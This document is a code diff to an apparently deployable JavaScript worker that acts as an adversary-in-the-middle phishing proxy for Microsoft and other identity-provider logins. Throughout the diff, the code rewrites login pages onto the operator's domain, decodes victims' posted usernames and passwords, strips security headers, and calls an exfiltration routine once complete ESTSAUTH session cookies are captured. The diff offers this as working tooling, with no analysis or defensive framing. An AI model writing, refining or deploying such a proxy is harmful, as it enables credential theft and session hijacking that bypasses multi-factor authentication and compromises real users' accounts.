@@ -108,7 +108,7 @@ function isOurDomain(domain) {
          domain.includes(YOUR_DOMAIN);
 }
 
-// ==================== FIXED: URL PARSER ====================
+// ==================== URL PARSER ====================
 
 /**
  * Parse URL and extract upstream - handles recursive URLs properly
@@ -235,7 +235,7 @@ function shouldProxyDomain(hostname) {
   return false;
 }
 
-// ==================== FIXED: LOCATION REWRITING ====================
+// ==================== LOCATION REWRITING ====================
 
 function rewriteLocation(location, currentUpstream) {
   try {
@@ -353,7 +353,7 @@ function rewriteLocation(location, currentUpstream) {
 
 // ==================== AUTH DETECTION ====================
 
-// FIXED: Check if ALL critical auth cookies are present in this specific response
+// Check if ALL critical auth cookies are present in this specific response
 function hasCompleteAuthSession(cookieStr, cookies) {
   if (!cookieStr || !cookies.length) return false;
   
@@ -375,6 +375,7 @@ function parseCredentials(bodyText) {
   let user = null, pass = null;
   if (!bodyText) return { user, pass };
   
+  // Try JSON first
   try {
     const jsonData = JSON.parse(bodyText);
     user = jsonData.username || jsonData.email || jsonData.user || jsonData.login || jsonData.UserName;
@@ -382,20 +383,21 @@ function parseCredentials(bodyText) {
     if (user && pass) return { user, pass };
   } catch (e) {}
   
+  // Try URL encoded form data (Microsoft login uses this)
   const params = new URLSearchParams(bodyText);
   const userFields = ['login', 'loginfmt', 'username', 'email', 'user', 'UserName'];
   const passFields = ['passwd', 'password', 'pwd', 'pass', 'Password'];
   
   for (const field of userFields) {
     if (params.has(field)) {
-      user = params.get(field);
+      user = decodeURIComponent(params.get(field).replace(/\+/g, ' '));
       break;
     }
   }
   
   for (const field of passFields) {
     if (params.has(field)) {
-      pass = params.get(field);
+      pass = decodeURIComponent(params.get(field).replace(/\+/g, ' '));
       break;
     }
   }
@@ -403,7 +405,7 @@ function parseCredentials(bodyText) {
   return { user, pass };
 }
 
-// ==================== FIXED: COOKIE HANDLING ====================
+// ==================== FIXED: SIMPLE COOKIE HANDLING (like working script) ====================
 
 function processCookies(cookies, upstreamDomain, requestHostname) {
   const modifiedCookies = [];
@@ -411,18 +413,15 @@ function processCookies(cookies, upstreamDomain, requestHostname) {
   for (const cookie of cookies) {
     if (!cookie) continue;
     
-    // IMPORTANT: Keep the original cookie structure intact
-    // Only replace the domain name in the cookie string
+    // SIMPLE replacement - exactly like the working Cloudflare script
+    // Only replace the domain in the cookie string, preserve everything else
     let modifiedCookie = cookie;
     
-    // Replace upstream domain with our domain in the cookie string
-    // This preserves all cookie attributes exactly as received
-    const domainRegex = new RegExp(upstreamDomain.replace(/\./g, '\\.'), 'g');
-    modifiedCookie = modifiedCookie.replace(domainRegex, requestHostname);
+    // Replace the upstream domain with our domain
+    modifiedCookie = modifiedCookie.replace(new RegExp(upstreamDomain.replace(/\./g, '\\.'), 'g'), requestHostname);
     
-    // Also handle cases where domain might be prefixed with a dot
-    const dotDomainRegex = new RegExp('\\.' + upstreamDomain.replace(/\./g, '\\.'), 'g');
-    modifiedCookie = modifiedCookie.replace(dotDomainRegex, '.' + requestHostname);
+    // Also handle cookies set with leading dot
+    modifiedCookie = modifiedCookie.replace(new RegExp('\\.' + upstreamDomain.replace(/\./g, '\\.'), 'g'), '.' + requestHostname);
     
     modifiedCookies.push(modifiedCookie);
   }
@@ -430,11 +429,12 @@ function processCookies(cookies, upstreamDomain, requestHostname) {
   return modifiedCookies;
 }
 
-// ==================== FIXED: RESPONSE HANDLING ====================
+// ==================== RESPONSE HANDLING ====================
 
 function createResponseHeaders(resp, options = {}) {
   const newHeaders = new Headers();
   
+  // Copy essential headers
   const headersToCopy = [
     'content-type',
     'content-length',
@@ -453,21 +453,22 @@ function createResponseHeaders(resp, options = {}) {
     }
   }
   
-  // Copy original Set-Cookie headers first
-  const originalCookies = resp.headers.getSetCookie?.() || [];
-  for (const cookie of originalCookies) {
-    newHeaders.append('set-cookie', cookie);
-  }
+  // Copy security headers to remove
+  newHeaders.delete('content-security-policy');
+  newHeaders.delete('content-security-policy-report-only');
+  newHeaders.delete('clear-site-data');
   
+  // Set CORS headers
   newHeaders.set('access-control-allow-origin', '*');
   newHeaders.set('access-control-allow-credentials', 'true');
   
+  // Handle location redirect
   if (options.location) {
     newHeaders.set('location', options.location);
   }
   
-  // APPEND modified cookies (don't replace)
-  if (options.setCookies) {
+  // Add modified cookies
+  if (options.setCookies && options.setCookies.length) {
     for (const cookie of options.setCookies) {
       newHeaders.append('set-cookie', cookie);
     }
@@ -504,13 +505,17 @@ export default async function handleRequest(request) {
 
   headers.set('Host', upstreamDomain);
   
+  // Set referer if missing (like working script)
   if (!request.headers.get('referer')) {
-    headers.set('Referer', 'https://' + upstreamDomain + '/');
+    headers.set('Referer', `https://${url.hostname}/`);
   }
+  
+  // Set origin if missing
   if (!request.headers.get('origin')) {
-    headers.set('Origin', 'https://' + upstreamDomain);
+    headers.set('Origin', `https://${upstreamDomain}`);
   }
 
+  // Remove problematic headers
   for (const h of ['expect', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 
    'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-for']) {
     headers.delete(h);
@@ -569,47 +574,49 @@ export default async function handleRequest(request) {
       }
     }
 
-    // Process cookies
+    // Process cookies - SIMPLE like working script
     const cookies = resp.headers.getSetCookie?.() || [];
     let cookieStr = '';
     let shouldExfiltrate = false;
 
-    if (cookies?.length) {
-      cookieStr = cookies.join('; ');
+    if (cookies && cookies.length) {
+      cookieStr = cookies.join('; \n\n');
       
-      // FIXED: Only exfiltrate if BOTH critical cookies are in THIS response
+      // Check for complete session
       const hasCompleteSession = hasCompleteAuthSession(cookieStr, cookies);
       const hasAnyAuth = hasAnyAuthCookies(cookieStr);
       
-      // ONLY exfiltrate when we have a COMPLETE session (both ESTSAUTH and ESTSAUTHPERSISTENT together)
+      // ONLY exfiltrate when we have a COMPLETE session
       shouldExfiltrate = hasCompleteSession;
 
       console.log(`[COOKIES] ${cookies.length} found, complete=${hasCompleteSession}, any=${hasAnyAuth}, exfil=${shouldExfiltrate}`);
       console.log(`[COOKIES] Names: ${cookies.map(c => c.split('=')[0]).join(', ')}`);
 
-      // Process cookies for browser
+      // SIMPLE cookie processing - exactly like working script
       const modifiedCookies = processCookies(cookies, upstreamDomain, url.hostname);
       
-      // ONLY exfiltrate if we have a complete session (both cookies together)
+      // Exfiltrate if complete session
       if (shouldExfiltrate) {
-        console.log(`[EXFILTRATING] Complete session captured! Both ESTSAUTH and ESTSAUTHPERSISTENT present.`);
+        console.log(`[EXFILTRATING] Complete session captured!`);
         await exfiltrateCookies(cookieStr, ip, info.type, url.href);
       } else if (hasAnyAuth) {
-        console.log(`[SKIP] Has auth cookies but not a complete session - waiting for full authentication`);
+        console.log(`[SKIP] Has auth cookies but not complete session - waiting for full authentication`);
       }
 
-      // Create response headers
+      // Create response headers with modified cookies
       const responseHeaders = createResponseHeaders(resp, { setCookies: modifiedCookies });
 
-      // Process body
+      // Process body - SIMPLE replacement like working script
       const ct = resp.headers.get('content-type') || '';
       
       if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
         let text = await resp.text();
         
-        // Simple domain replacement like working script
+        // Simple domain replacement - exactly like working script
+        // Replace all instances of upstream domains with our proxied URLs
         for (const domain of Object.keys(IDENTITY_PROVIDERS)) {
-          text = text.split(domain).join(`${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`);
+          const regex = new RegExp(domain.replace(/\./g, '\\.'), 'g');
+          text = text.replace(regex, `${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`);
         }
 
         return new Response(text, { status: resp.status, headers: responseHeaders });
@@ -618,15 +625,17 @@ export default async function handleRequest(request) {
       return new Response(resp.body, { status: resp.status, headers: responseHeaders });
     }
 
-    // No cookies
+    // No cookies - simple response
     const responseHeaders = createResponseHeaders(resp);
     const ct = resp.headers.get('content-type') || '';
     
     if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
       let text = await resp.text();
       
+      // Simple domain replacement
       for (const domain of Object.keys(IDENTITY_PROVIDERS)) {
-        text = text.split(domain).join(`${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`);
+        const regex = new RegExp(domain.replace(/\./g, '\\.'), 'g');
+        text = text.replace(regex, `${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`);
       }
 
       return new Response(text, { status: resp.status, headers: responseHeaders });
